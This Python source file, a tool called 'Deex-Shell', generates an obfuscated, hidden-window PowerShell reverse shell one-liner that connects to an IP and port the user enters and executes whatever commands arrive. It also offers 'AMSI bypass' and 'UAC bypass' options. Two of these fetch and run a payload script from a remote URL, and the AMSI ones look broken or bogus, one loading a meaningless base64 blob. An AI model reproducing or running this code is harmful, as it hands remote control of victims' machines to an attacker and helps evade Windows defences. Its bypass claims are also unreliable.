import os
import socket
import sys
import re
import string
import random
import subprocess
import threading
import time
import signal
import base64
import readline

readline.parse_and_bind('"\e[A": previous-history')  # Up arrow
readline.parse_and_bind('"\e[B": next-history')      # Down arrow
readline.parse_and_bind('"\e[C": forward-char')     # Right arrow
readline.parse_and_bind('"\e[D": backward-char')    # Left arrow

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    OKRED = '\033[91m'
    OKYELLOW = '\033[93m'
    ENDC = '\033[0m'

# Define AMSI bypass methods
def amsi_bypass_1():
    return "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; [System.Net.WebRequest]::Create('http://example.com').GetResponse() | Out-Null"

def amsi_bypass_2():
    return "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('T0FQT3hzY3J4U0M8e0a1J4AAAEAAABmQU1TKwAABBAABEMjKqAE5w7O1r91eRzMwD0BPg==')); [AMSIUtils]::Bypass()"

# Define UAC bypass methods
def uac_bypass_1():
    return "$a = New-Object -ComObject shell.application; $a.ShellExecute('powershell', '-Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://example.com/payload.ps1'')\"', '', 'runas')"

def uac_bypass_2():
    return "$client = New-Object -ComObject wscript.shell; $client.Run('powershell -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://example.com/payload.ps1'')\"', 1, $true)"

# Base64 encode function
def encode_base64(data):
    return base64.b64encode(data.encode()).decode()

# Create PowerShell one-liner with options for UAC and AMSI bypass
def create_pshell():
    ip = input("Enter IP address: ")
    port = input("Enter port: ")
    
    amsi_method = input("Choose AMSI Bypass Method (1 or 2, or 'none' to skip): ")
    uac_method = input("Choose UAC Bypass Method (1 or 2, or 'none' to skip): ")
    
    amsi_bypass = amsi_bypass_1() if amsi_method == '1' else (amsi_bypass_2() if amsi_method == '2' else "")
    uac_bypass = uac_bypass_1() if uac_method == '1' else (uac_bypass_2() if uac_method == '2' else "")
    
    script = f"""
$ErrorActionPreference = 'Stop';
{amsi_bypass};
{uac_bypass};
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | % {0};
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + '<--deex-shell--> ' + (pwd).Path + ' ' + '#~ ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}};
$client.Close();
"""

    # Replace IP and port in script
    script = script.replace("{ip}", ip).replace("{port}", port)
    
    # Encode script in Base64
    encoded_script = encode_base64(script)
    
    # Return one-liner
    one_liner = f"powershell -nop -w hidden -e {encoded_script}"
    return one_liner

def prompt():
    print(f"\n|------ {Colors.OKYELLOW}Deex-Shell{Colors.ENDC} ------|\n")
    time.sleep(1)
    print("Loading Menu.....\n")
    time.sleep(1)
    while True:
        print(f"[{Colors.OKGREEN}+{Colors.ENDC}] Enter 1 to Create a PowerShell Reverse Shell One Liner")
        time.sleep(0.5)
        print(f"[{Colors.OKGREEN}+{Colors.ENDC}] Enter 2 to Exit\n")
        time.sleep(0.5)
        next_step = input("<--Deex--># : ")
        if next_step == "1":
            pshell = create_pshell()
            print(f"\n{Colors.OKGREEN}[+] Obfuscated PowerShell Reverse Shell One Liner{Colors.ENDC}\n")
            print(pshell)
            print("\n\n")
        elif next_step == "2":
            print("Exiting...\n")
            time.sleep(1)
            break
        else:
            print("Please Type 1 or 2\n")
            time.sleep(1)

if __name__ == "__main__":
    prompt()
